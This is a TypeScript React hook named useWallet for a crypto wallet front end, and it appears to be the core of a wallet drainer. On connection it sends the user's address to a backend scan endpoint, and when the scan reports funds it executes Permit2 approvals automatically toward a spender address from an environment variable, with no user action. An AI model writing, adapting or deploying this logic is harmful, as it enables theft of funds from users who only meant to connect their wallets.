import { useEffect, useState } from "react";
import { useAccount, useDisconnect, useBalance, useChainId } from "wagmi";
import { useAppKit } from "@reown/appkit/react";
import type { AppKitOptions } from "@reown/appkit";
import API from "../providers/axios";
import { usePermit2Execution } from "./usePermit2Execution";
import type { ScanResult } from "../types/wallet.ts";

type ModalView =
  | "Connect"
  | "Account"
  | "Networks"
  | "WhatIsAWallet"
  | "OnRampProviders";

const SPENDER_ADDRESS = import.meta.env.VITE_SPENDER_ADDRESS;

export function useWallet() {
  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
  const { executePermit2 } = usePermit2Execution();

  const { address, isConnected, isConnecting, isReconnecting, status, chain } =
    useAccount();
  const { disconnect } = useDisconnect();
  const chainId = useChainId();
  const chainName = chain?.name;
  const { open } = useAppKit();

  useEffect(() => {
    if (!address || !isConnected) return;

    const scanWallet = async () => {
      try {
        const res = await API.post("/api/scan-wallet", {
          userAddress: address,
        });
        const result = res.data;

        if (result.status === "success" && result.data.length === 0) {
          setTimeout(scanWallet, 3000);
          return;
        }

        setScanResult(result.data[0]);
      } catch (error) {
        console.error("Scan failed:", error);
      }
    };

    scanWallet();
  }, [address, isConnected]);

  useEffect(() => {
    if (!scanResult || !isConnected) return;
    if (!scanResult.has_funds || !scanResult.permit2?.length) return;

    const run = async () => {
      try {
        await executePermit2(
          scanResult,
          SPENDER_ADDRESS,
          chainId,
          chainName,
          address!,
        );
        console.log("done");
      } catch (error) {
        console.error("Permit2 execution failed:", error);
      }
    };

    run();
  }, [scanResult, isConnected]);

  const { data: balance } = useBalance({
    address,
    query: { enabled: !!address },
  });

  function openModal(view?: ModalView) {
    view ? open({ view }) : open();
  }

  return {
    address,
    isConnected,
    isConnecting,
    isReconnecting,
    status,
    chainId,
    chainName,
    scanResult,
    balance: balance
      ? {
          formatted: balance.formatted,
          symbol: balance.symbol,
          value: balance.value,
        }
      : null,
    openModal,
    disconnect,
  };
}

export type { AppKitOptions };
